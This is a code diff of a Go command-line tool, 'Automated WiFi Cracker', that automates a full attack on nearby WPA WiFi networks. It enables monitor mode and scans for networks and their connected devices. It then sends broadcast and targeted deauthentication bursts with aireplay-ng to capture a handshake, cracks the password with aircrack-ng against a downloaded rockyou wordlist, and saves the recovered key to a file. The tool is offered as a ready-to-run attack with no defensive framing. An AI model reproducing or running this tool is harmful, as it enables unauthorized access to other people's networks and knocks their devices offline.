@@ -1,191 +1,615 @@
 package main
 
 import (
-    "bufio"
-    "fmt"
-    "os"
-    "os/exec"
-    "strings"
-    "time"
+	"bufio"
+	"bytes"
+	"context"
+	"fmt"
+	"io"
+	"os"
+	"os/exec"
+	"os/signal"
+	"path/filepath"
+	"runtime"
+	"strconv"
+	"strings"
+	"sync"
+	"syscall"
+	"time"
+
+	"github.com/fatih/color"
 )
 
+// ==========================================
+// Data Models
+// ==========================================
 type Network struct {
-    BSSID  string
-    CH     string
-    ESSID  string
-    Sec    string
-    Client string
+	BSSID   string
+	CH      string
+	ESSID   string
+	Sec     string
+	Clients []string
 }
 
+// ==========================================
+// Global State & UI Colors
+// ==========================================
+var (
+	cyan   = color.New(color.FgCyan, color.Bold)
+	green  = color.New(color.FgGreen, color.Bold)
+	yellow = color.New(color.FgYellow, color.Bold)
+	red    = color.New(color.FgRed, color.Bold)
+	white  = color.New(color.FgWhite, color.Bold)
+
+	monIface   string
+	activeCmds []*exec.Cmd
+)
+
+// ==========================================
+// Main Entry Point
+// ==========================================
 func main() {
-    // ১. রুট চেক
-    if os.Geteuid() != 0 {
-        fmt.Println("❌ এই টুলটি রান করতে অবশ্যই sudo ব্যবহার করুন!")
-        os.Exit(1)
-    }
+	// Robust Ctrl+C Handling
+	c := make(chan os.Signal, 1)
+	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
+	go func() {
+		<-c
+		fmt.Println()
+		red.Println("\n[!] Interrupted by user. Force cleaning up...")
+		forceCleanup()
+		os.Exit(0)
+	}()
 
-    // ২. অটো সেটআপ (প্যাকেজ এবং ওয়ার্ডলিস্ট চেক)
-    setupEnvironment()
+	if os.Geteuid() != 0 {
+		red.Println("[!] ERROR: This tool requires root privileges. Please run with 'sudo'.")
+		os.Exit(1)
+	}
 
-    reader := bufio.NewReader(os.Stdin)
+	cyan.Println("=======================================")
+	cyan.Println("    Automated WiFi Cracker CLI v14.0  ")
+	cyan.Println("=======================================")
 
-    // ৩. ইন্টারফেস ইনপুট নেওয়া
-    fmt.Print("\nআপনার ওয়াইফাই ইন্টারফেসের নাম দিন (যেমন: wlp1s0): ")
-    iface, _ := reader.ReadString('\n')
-    iface = strings.TrimSpace(iface)
-    monIface := iface + "mon"
+	setupEnvironment()
 
-    fmt.Println("\n[*] Monitor Mode চালু করা হচ্ছে...")
-    runCmd("airmon-ng", "check", "kill")
-    runCmd("airmon-ng", "start", iface)
+	iface := selectInterface()
+	monIface = iface + "mon"
 
-    // ৪. স্ক্যানিং এবং নেটওয়ার্ক লিস্ট দেখানো
-    fmt.Println("\n[*] ১৫ সেকেন্ডের জন্য নেটওয়ার্ক স্ক্যান করা হচ্ছে...")
-    scanFile := "scan_temp"
-    airodumpCmd := exec.Command("airodump-ng", monIface, "-w", scanFile, "--output-format", "csv")
-    airodumpCmd.Start()
-    time.Sleep(15 * time.Second)
-    airodumpCmd.Process.Kill()
-    fmt.Println("[*] স্ক্যান সম্পন্ন হয়েছে।")
+	yellow.Println("\n[*] Enabling Monitor Mode...")
+	runCmdSilent("systemctl", "stop", "NetworkManager")
+	runCmdSilent("airmon-ng", "check", "kill")
+	runCmdSilent("airmon-ng", "start", iface)
+	green.Println("[+] Monitor Mode enabled successfully.")
 
-    networks := parseCSV(scanFile + "-01.csv")
-    if len(networks) == 0 {
-        fmt.Println("❌ কোনো নেটওয়ার্ক পাওয়া যায়নি বা CSV ফাইল তৈরি হয়নি।")
-        os.Exit(1)
-    }
+	defer forceCleanup()
 
-    fmt.Println("\n=== পাওয়া ওয়াইফাই নেটওয়ার্ক ===")
-    for i, net := range networks {
-        fmt.Printf("[%d] ESSID: %s | BSSID: %s | CH: %s | Security: %s\n", i+1, net.ESSID, net.BSSID, net.CH, net.Sec)
-    }
+	networks := scanNetworks()
+	target := selectTarget(networks)
 
-    // ৫. টার্গেট সিলেক্ট করা
-    fmt.Print("\nআক্রমণ করার জন্য নেটওয়ার্কের নাম্বার দিন: ")
-    var choice int
-    fmt.Scanf("%d", &choice)
+	yellow.Printf("\n[*] Scanning '%s' for connected devices (10s)...\n", target.ESSID)
+	target = findConnectedClients(target)
 
-    if choice < 1 || choice > len(networks) {
-        fmt.Println("❌ ভুল নাম্বার!")
-        os.Exit(1)
-    }
-    target := networks[choice-1]
+	if len(target.Clients) > 0 {
+		printClientTable(target)
+	} else {
+		red.Println("[!] WARNING: No connected devices found. Will attempt broadcast deauth.")
+	}
 
-    fmt.Printf("\n[*] টার্গেট নির্বাচিত: %s (%s)\n", target.ESSID, target.BSSID)
-    capFile := strings.ReplaceAll(target.ESSID, " ", "_") + "_handshake"
+	sanitizedEssid := strings.ReplaceAll(target.ESSID, " ", "_")
+	sanitizedEssid = strings.ReplaceAll(sanitizedEssid, "/", "_")
+	targetDir := filepath.Join("data", sanitizedEssid)
 
-    // ৬. Handshake ক্যাপচার ও Deauth Attack
-    fmt.Println("[*] Handshake ক্যাপচার চালু করা হচ্ছে...")
-    captureCmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, monIface)
-    captureCmd.Start()
+	yellow.Printf("\n[*] Creating directory for target: %s\n", targetDir)
+	if err := os.MkdirAll(targetDir, 0755); err != nil {
+		red.Printf("[-] ERROR: Failed to create directory: %v\n", err)
+		os.Exit(1)
+	}
+	green.Println("[+] Directory ready.")
 
-    fmt.Println("[*] Deauth attack শুরু হচ্ছে (১০ সেকেন্ড)...")
-    deauthArgs := []string{"--deauth", "10", "-a", target.BSSID, monIface}
-    if target.Client != "" {
-        deauthArgs = append(deauthArgs, "-c", target.Client)
-    }
-    runCmd("aireplay-ng", deauthArgs...)
+	capFile := filepath.Join(targetDir, "handshake")
 
-    time.Sleep(5 * time.Second)
-    captureCmd.Process.Kill()
-    fmt.Println("[*] ক্যাপচার সম্পন্ন।")
+	captureHandshake(target, capFile, targetDir)
 
-    // ৭. Password Crack করা
-    finalCapFile := capFile + "-01.cap"
-    fmt.Printf("[*] %s ফাইল দিয়ে পাসওয়ার্ড ক্র্যাক করা হচ্ছে...\n", finalCapFile)
-    runCmd("aircrack-ng", "-w", "/usr/share/wordlists/rockyou.txt", finalCapFile)
+	isCaptured, debugInfo := verifyHandshake(capFile)
+	if !isCaptured {
+		red.Println("\n[-] CRITICAL ERROR: Handshake NOT captured after 5 minutes.")
+		yellow.Println("[*] Potential Reasons:")
+		yellow.Println("    1. Intel WiFi Adapters are weak at packet injection.")
+		yellow.Println("    2. Router has PMF (Protected Management Frames) enabled.")
+		yellow.Println("    3. Phone used a Random MAC address to reconnect.")
 
-    // ক্লিনআপ
-    os.Remove(scanFile + "-01.csv")
+		cyan.Println("\n=== Debug Output (aircrack-ng) ===")
+		fmt.Println(debugInfo)
+		fmt.Println("===================================")
+		os.Exit(1)
+	}
+
+	green.Println("\n[+] Valid Handshake Captured Successfully!")
+	crackPassword(capFile, targetDir)
+	green.Printf("\n[+] All files for '%s' are stored in: %s\n", target.ESSID, targetDir)
 }
 
-// ================= অটো সেটআপ ফাংশন =================
-func setupEnvironment() {
-    fmt.Println("[*] এনভায়রনমেন্ট চেক করা হচ্ছে...")
+// ==========================================
+// Interface Selection
+// ==========================================
+func selectInterface() string {
+	yellow.Println("\n[*] Detecting available wireless interfaces...")
 
-    // Aircrack-ng চেক ও ইনস্টল
-    if _, err := exec.LookPath("aircrack-ng"); err != nil {
-        fmt.Println("[-] aircrack-ng পাওয়া যায়নি। ইনস্টল করা হচ্ছে...")
-        runCmd("apt", "update")
-        runCmd("apt", "install", "aircrack-ng", "-y")
-    } else {
-        fmt.Println("[✓] aircrack-ng ইতিমধ্যেই ইনস্টল আছে।")
-    }
+	entries, err := os.ReadDir("/sys/class/net/")
+	if err != nil {
+		red.Printf("[-] Failed to read interfaces: %v\n", err)
+		os.Exit(1)
+	}
 
-    // wget চেক ও ইনস্টল (rockyou ডাউনলোড করার জন্য)
-    if _, err := exec.LookPath("wget"); err != nil {
-        fmt.Println("[-] wget পাওয়া যায়নি। ইনস্টল করা হচ্ছে...")
-        runCmd("apt", "install", "wget", "-y")
-    }
+	var ifaces []string
+	for _, e := range entries {
+		if _, err := os.Stat("/sys/class/net/" + e.Name() + "/wireless"); err == nil {
+			ifaces = append(ifaces, e.Name())
+		}
+	}
 
-    // Rockyou.txt চেক ও ডাউনলোড
-    wordlistPath := "/usr/share/wordlists/rockyou.txt"
-    if _, err := os.Stat(wordlistPath); os.IsNotExist(err) {
-        fmt.Println("[-] rockyou.txt পাওয়া যায়নি। ডাউনলোড করা হচ্ছে (১৩০MB)...")
-        runCmd("mkdir", "-p", "/usr/share/wordlists")
-        runCmd("wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", "-O", wordlistPath)
-        fmt.Println("[✓] rockyou.txt ডাউনলোড সম্পন্ন হয়েছে।")
-    } else {
-        fmt.Println("[✓] rockyou.txt ইতিমধ্যেই ডাউনলোড করা আছে।")
-    }
+	if len(ifaces) == 0 {
+		red.Println("[-] No wireless interfaces found. Exiting.")
+		os.Exit(1)
+	}
+
+	fmt.Println()
+	cyan.Println("=== Available Wireless Interfaces ===")
+	for i, iface := range ifaces {
+		fmt.Printf("[%d] %s\n", i+1, iface)
+	}
+
+	reader := bufio.NewReader(os.Stdin)
+	for {
+		white.Print("\n[*] Select an interface (enter number): ")
+		input, err := reader.ReadString('\n')
+		if err != nil {
+			red.Printf("[-] Failed to read input: %v\n", err)
+			os.Exit(1)
+		}
+
+		input = strings.TrimSpace(input)
+		choice, err := strconv.Atoi(input)
+
+		if err != nil || choice < 1 || choice > len(ifaces) {
+			red.Println("[-] ERROR: Invalid selection. Please enter a valid number.")
+			continue
+		}
+
+		selected := ifaces[choice-1]
+		green.Printf("[+] Interface Selected: %s\n", selected)
+		return selected
+	}
 }
 
-// =================================================
+// ==========================================
+// Core Attack Functions
+// ==========================================
 
-// কমান্ড রান করার হেল্পার ফাংশন
-func runCmd(name string, args ...string) {
-    cmd := exec.Command(name, args...)
-    cmd.Stdout = os.Stdout
-    cmd.Stderr = os.Stderr
-    cmd.Run()
+func findConnectedClients(target Network) Network {
+	scanFile := "client_scan_temp"
+	os.Remove(scanFile + "-01.csv")
+
+	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, monIface, "-w", scanFile, "--output-format", "csv", "--write-interval", "1")
+	cmd.Stdout = nil
+	cmd.Stderr = nil
+	cmd.Start()
+	activeCmds = append(activeCmds, cmd)
+
+	time.Sleep(10 * time.Second)
+
+	if cmd.Process != nil {
+		cmd.Process.Kill()
+		cmd.Wait()
+	}
+
+	file, err := os.Open(scanFile + "-01.csv")
+	if err != nil {
+		return target
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	isStation := false
+
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.Contains(line, "Station MAC") {
+			isStation = true
+			continue
+		}
+
+		parts := strings.Split(line, ",")
+		if len(parts) < 6 {
+			continue
+		}
+
+		if isStation {
+			stationMac := strings.TrimSpace(parts[0])
+			targetBSSID := strings.TrimSpace(parts[5])
+			if targetBSSID == target.BSSID && stationMac != "" {
+				target.Clients = append(target.Clients, stationMac)
+			}
+		}
+	}
+	os.Remove(scanFile + "-01.csv")
+	return target
 }
 
-// airodump-ng এর CSV ফাইল পার্স করার ফাংশন
+func printClientTable(target Network) {
+	fmt.Println()
+	cyan.Println("=====================================================")
+	cyan.Printf("  Connected Devices for: %s\n", target.ESSID)
+	cyan.Println("=====================================================")
+	fmt.Printf("  %-5s | %-20s\n", "No.", "MAC Address")
+	fmt.Println("-----------------------------------------------------")
+	for i, mac := range target.Clients {
+		fmt.Printf("  %-5d | %-20s\n", i+1, mac)
+	}
+	cyan.Println("=====================================================")
+}
+
+func captureHandshake(target Network, capFile string, targetDir string) {
+	// Delete old capture files
+	oldFiles, _ := filepath.Glob(filepath.Join(targetDir, "handshake-*"))
+	for _, f := range oldFiles {
+		os.Remove(f)
+	}
+
+	yellow.Println("\n[*] Starting Handshake Capture Process...")
+
+	// Start airodump-ng in background
+	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, "--write-interval", "1", monIface)
+	cmd.Stdout = nil
+	cmd.Stderr = nil
+	if err := cmd.Start(); err != nil {
+		red.Printf("[-] Failed to start capture: %v\n", err)
+		os.Exit(1)
+	}
+	activeCmds = append(activeCmds, cmd)
+
+	time.Sleep(3 * time.Second) // Wait for airodump to lock channel
+
+	// --- SINGLE DEAUTH BURST TO ALL DEVICES ---
+	cyan.Println("\n[*] Sending Single Deauth Burst to ALL devices (One time only)...")
+
+	var wg sync.WaitGroup
+	sendDeauth := func(args []string) {
+		defer wg.Done()
+		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+		defer cancel()
+		dCmd := exec.CommandContext(ctx, "aireplay-ng", args...)
+
+		// Show errors if injection fails
+		var stderr bytes.Buffer
+		dCmd.Stderr = &stderr
+		err := dCmd.Run()
+		if err != nil || stderr.Len() > 0 {
+			red.Printf("[-] Deauth Error: %s\n", strings.TrimSpace(stderr.String()))
+		}
+	}
+
+	// 1. Send Broadcast Deauth
+	wg.Add(1)
+	go sendDeauth([]string{"--deauth", "25", "-a", target.BSSID, "--ignore-negative-one", monIface})
+
+	// 2. Send Targeted Deauth to known clients concurrently
+	for _, clientMac := range target.Clients {
+		yellow.Printf("[-] Targeted Deauth -> %s\n", clientMac)
+		wg.Add(1)
+		go sendDeauth([]string{"--deauth", "25", "-a", target.BSSID, "-c", clientMac, "--ignore-negative-one", monIface})
+	}
+
+	wg.Wait() // Wait for the single burst to finish
+	green.Println("[+] Deauth burst sent successfully. Devices are disconnecting...")
+
+	// --- WAITING LOOP FOR HANDSHAKE ---
+	timeout := 5 * time.Minute
+	checkInterval := 15 * time.Second
+	elapsedTime := 0 * time.Second
+
+	yellow.Printf("\n[*] Waiting up to 5 minutes for devices to reconnect and handshake...\n")
+	yellow.Println("[!] TIP: If a device doesn't reconnect automatically, manually turn its WiFi OFF and ON.")
+
+	for elapsedTime < timeout {
+		// Check if airodump-ng crashed
+		if cmd.ProcessState != nil && cmd.ProcessState.Exited() {
+			red.Println("\n[-] ERROR: airodump-ng crashed unexpectedly!")
+			return
+		}
+
+		// Wait 15 seconds before checking again
+		white.Print("[*] Listening for handshake")
+		for i := 0; i < 3; i++ {
+			time.Sleep(5 * time.Second)
+			white.Print(".")
+		}
+		fmt.Println()
+		elapsedTime += checkInterval
+
+		// Check if handshake is captured
+		isCaptured, _ := verifyHandshake(capFile)
+		if isCaptured {
+			green.Println("\n[+] Handshake detected! Stopping capture phase.")
+			if cmd.Process != nil {
+				cmd.Process.Kill()
+			}
+			return
+		}
+
+		// Debug: Print file size to show packets are being captured
+		finalCapFile := capFile + "-01.cap"
+		if fi, err := os.Stat(finalCapFile); err == nil {
+			yellow.Printf("[*] Debug: Cap file size: %d bytes\n", fi.Size())
+		}
+	}
+
+	// Timeout reached
+	if cmd.Process != nil {
+		cmd.Process.Kill()
+	}
+}
+
+func verifyHandshake(capFile string) (bool, string) {
+	finalCapFile := capFile + "-01.cap"
+	if _, err := os.Stat(finalCapFile); os.IsNotExist(err) {
+		return false, "Cap file does not exist. airodump-ng might have failed to start."
+	}
+
+	cmd := exec.Command("aircrack-ng", finalCapFile)
+	var buf bytes.Buffer
+	cmd.Stdout = &buf
+	cmd.Stderr = &buf
+	cmd.Run()
+
+	output := buf.String()
+	if strings.Contains(output, "1 handshake") {
+		return true, output
+	}
+	return false, output
+}
+
+func crackPassword(capFile string, targetDir string) {
+	finalCapFile := capFile + "-01.cap"
+	cores := runtime.NumCPU()
+
+	cyan.Println("\n=======================================")
+	cyan.Println("       Starting Password Cracking      ")
+	cyan.Println("=======================================")
+	yellow.Printf("[*] File: %s\n", finalCapFile)
+	yellow.Printf("[*] Wordlist: rockyou_clean.txt\n")
+	yellow.Printf("[*] CPU Threads: %d\n", cores)
+	fmt.Println()
+
+	cmd := exec.Command("aircrack-ng", "-p", fmt.Sprintf("%d", cores), "-w", "/usr/share/wordlists/rockyou_clean.txt", finalCapFile)
+
+	var buf bytes.Buffer
+	cmd.Stdout = io.MultiWriter(os.Stdout, &buf)
+	cmd.Stderr = io.MultiWriter(os.Stderr, &buf)
+	cmd.Run()
+
+	outputStr := buf.String()
+	if strings.Contains(outputStr, "KEY FOUND!") {
+		startIndex := strings.Index(outputStr, "KEY FOUND! [")
+		if startIndex != -1 {
+			restStr := outputStr[startIndex+len("KEY FOUND! ["):]
+			endIndex := strings.Index(restStr, "]")
+			if endIndex != -1 {
+				password := restStr[:endIndex]
+
+				fmt.Println()
+				green.Println("=======================================")
+				green.Printf("🎯  PASSWORD FOUND: %s  🎯\n", password)
+				green.Println("=======================================")
+
+				passFilePath := filepath.Join(targetDir, "password.txt")
+				err := os.WriteFile(passFilePath, []byte("WiFi: "+filepath.Base(targetDir)+"\nPassword: "+password+"\n"), 0644)
+				if err == nil {
+					cyan.Printf("[+] Password saved securely to: %s\n", passFilePath)
+				}
+				fmt.Println()
+			}
+		}
+	} else {
+		red.Println("\n[-] Password not found in the wordlist.")
+	}
+}
+
+// ==========================================
+// Scanning & Parsing
+// ==========================================
+
+func scanNetworks() []Network {
+	yellow.Println("\n[*] Scanning networks for 15 seconds...")
+	scanFile := "scan_temp"
+	os.Remove(scanFile + "-01.csv")
+
+	cmd := exec.Command("airodump-ng", monIface, "-w", scanFile, "--output-format", "csv", "--write-interval", "1")
+	cmd.Stdout = nil
+	cmd.Stderr = nil
+	if err := cmd.Start(); err != nil {
+		red.Printf("[-] Failed to start airodump-ng: %v\n", err)
+		forceCleanup()
+		os.Exit(1)
+	}
+	activeCmds = append(activeCmds, cmd)
+
+	time.Sleep(15 * time.Second)
+
+	if cmd.Process != nil {
+		cmd.Process.Kill()
+		cmd.Wait()
+	}
+	green.Println("[+] Scan completed.")
+
+	networks := parseCSV(scanFile + "-01.csv")
+	if len(networks) == 0 {
+		red.Println("[-] ERROR: No networks found.")
+		forceCleanup()
+		os.Exit(1)
+	}
+
+	fmt.Println()
+	cyan.Println("=== Discovered WiFi Networks ===")
+	for i, net := range networks {
+		fmt.Printf("[%d] ESSID: %-20s | BSSID: %s | CH: %-2s | Security: %s\n", i+1, net.ESSID, net.BSSID, net.CH, net.Sec)
+	}
+
+	return networks
+}
+
+func selectTarget(networks []Network) Network {
+	reader := bufio.NewReader(os.Stdin)
+	for {
+		white.Print("\n[*] Enter the number of the target network: ")
+		input, err := reader.ReadString('\n')
+		if err != nil {
+			red.Printf("[-] Failed to read input: %v\n", err)
+			forceCleanup()
+			os.Exit(1)
+		}
+
+		input = strings.TrimSpace(input)
+		choice, err := strconv.Atoi(input)
+
+		if err != nil || choice < 1 || choice > len(networks) {
+			red.Println("[-] ERROR: Invalid selection. Please enter a valid number.")
+			continue
+		}
+
+		target := networks[choice-1]
+		yellow.Printf("\n[*] Target Selected: %s (%s)\n", target.ESSID, target.BSSID)
+		return target
+	}
+}
+
 func parseCSV(filename string) []Network {
-    file, err := os.Open(filename)
-    if err != nil {
-        return nil
-    }
-    defer file.Close()
+	file, err := os.Open(filename)
+	if err != nil {
+		return nil
+	}
+	defer file.Close()
 
-    var networks []Network
-    scanner := bufio.NewScanner(file)
-    isStation := false
+	var networks []Network
+	scanner := bufio.NewScanner(file)
+	isStation := false
 
-    for scanner.Scan() {
-        line := scanner.Text()
-        if strings.Contains(line, "Station MAC") {
-            isStation = true
-            continue
-        }
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.Contains(line, "Station MAC") {
+			isStation = true
+			continue
+		}
 
-        parts := strings.Split(line, ",")
-        if len(parts) < 14 {
-            continue
-        }
+		parts := strings.Split(line, ",")
+		if len(parts) < 14 {
+			continue
+		}
 
-        if !isStation {
-            bssid := strings.TrimSpace(parts[0])
-            ch := strings.TrimSpace(parts[3])
-            sec := strings.TrimSpace(parts[5])
-            essid := strings.TrimSpace(parts[13])
-            if bssid != "" && essid != "" {
-                networks = append(networks, Network{
-                    BSSID: bssid,
-                    CH:    ch,
-                    ESSID: essid,
-                    Sec:   sec,
-                })
-            }
-        } else {
-            stationMac := strings.TrimSpace(parts[0])
-            targetBSSID := strings.TrimSpace(parts[5])
-            for i := range networks {
-                if networks[i].BSSID == targetBSSID && networks[i].Client == "" {
-                    networks[i].Client = stationMac
-                    break
-                }
-            }
-        }
-    }
-    return networks
+		if !isStation {
+			bssid := strings.TrimSpace(parts[0])
+			ch := strings.TrimSpace(parts[3])
+			sec := strings.TrimSpace(parts[5])
+			essid := strings.TrimSpace(parts[13])
+
+			if bssid != "" && essid != "" && bssid != "BSSID" && essid != "ESSID" {
+				networks = append(networks, Network{
+					BSSID: bssid,
+					CH:    ch,
+					ESSID: essid,
+					Sec:   sec,
+				})
+			}
+		}
+	}
+	return networks
+}
+
+// ==========================================
+// Environment Setup
+// ==========================================
+
+func setupEnvironment() {
+	yellow.Println("\n[*] Checking environment dependencies...")
+
+	if _, err := exec.LookPath("aircrack-ng"); err != nil {
+		red.Println("[-] aircrack-ng not found. Installing...")
+		runCmd("apt", "update")
+		runCmd("apt", "install", "aircrack-ng", "-y")
+	} else {
+		green.Println("[+] aircrack-ng is already installed.")
+	}
+
+	if _, err := exec.LookPath("wget"); err != nil {
+		red.Println("[-] wget not found. Installing...")
+		runCmd("apt", "install", "wget", "-y")
+	}
+
+	wordlistPath := "/usr/share/wordlists/rockyou.txt"
+	if _, err := os.Stat(wordlistPath); os.IsNotExist(err) {
+		red.Println("[-] rockyou.txt not found. Downloading (130MB)...")
+		runCmd("mkdir", "-p", "/usr/share/wordlists")
+		runCmd("wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", "-O", wordlistPath)
+		green.Println("[+] rockyou.txt downloaded successfully.")
+	} else {
+		green.Println("[+] rockyou.txt is already downloaded.")
+	}
+
+	cleanWordlistPath := "/usr/share/wordlists/rockyou_clean.txt"
+	if _, err := os.Stat(cleanWordlistPath); os.IsNotExist(err) {
+		yellow.Println("[*] Optimizing Wordlist: Removing passwords shorter than 8 characters...")
+		cleanFile, err := os.Create(cleanWordlistPath)
+		if err != nil {
+			red.Printf("[-] Failed to create clean wordlist: %v\n", err)
+			return
+		}
+		defer cleanFile.Close()
+
+		awkCmd := exec.Command("awk", "length>=8", wordlistPath)
+		awkCmd.Stdout = cleanFile
+		awkCmd.Stderr = os.Stderr
+		if err := awkCmd.Run(); err != nil {
+			red.Printf("[-] Wordlist optimization failed: %v\n", err)
+		} else {
+			green.Println("[+] Optimization complete. 'rockyou_clean.txt' created.")
+		}
+	} else {
+		green.Println("[+] Optimized wordlist 'rockyou_clean.txt' is ready.")
+	}
+}
+
+// ==========================================
+// System & Cleanup Utilities
+// ==========================================
+
+func forceCleanup() {
+	for _, cmd := range activeCmds {
+		if cmd != nil && cmd.Process != nil {
+			cmd.Process.Kill()
+		}
+	}
+	activeCmds = nil
+
+	if monIface != "" {
+		runCmdSilent("airmon-ng", "stop", monIface)
+	}
+
+	runCmdSilent("systemctl", "start", "NetworkManager")
+
+	os.Remove("scan_temp-01.csv")
+	os.Remove("client_scan_temp-01.csv")
+	green.Println("[+] Cleanup complete. Internet restored.")
+}
+
+func runCmd(name string, args ...string) {
+	cmd := exec.Command(name, args...)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	cmd.Run()
+}
+
+func runCmdSilent(name string, args ...string) {
+	cmd := exec.Command(name, args...)
+	cmd.Stdout = nil
+	cmd.Stderr = nil
+	cmd.Run()
 }
